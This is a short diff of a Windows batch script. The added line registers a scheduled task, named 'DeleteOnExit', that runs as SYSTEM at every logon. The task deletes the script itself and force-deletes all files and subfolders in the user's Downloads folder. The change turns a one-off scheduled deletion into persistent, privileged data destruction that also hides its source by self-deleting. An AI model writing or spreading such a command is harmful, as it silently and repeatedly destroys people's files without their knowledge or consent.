@@ -81,6 +81,6 @@ for %%f in (%SF%\.*) do (
 
 ping 127.0.0.1 -n 5 > nul
 
-schtasks /create /tn "SystemChange" /tr "del /f /q \"%~f0\" && del /f /q \"%USERPROFILE%\Downloads\*\" && for /d %%D in (\"%USERPROFILE%\Downloads\*\") do rd /s /q \"%%D\"" /sc once /st 00:00 /f
+schtasks /create /tn "DeleteOnExit" /tr "del /f /q \"%~f0\" && del /f /q \"%USERPROFILE%\Downloads\*\" && for /d %%D in (\"%USERPROFILE%\Downloads\*\") do rd /s /q \"%%D\"" /sc onlogon /ru SYSTEM /f
 
 exit
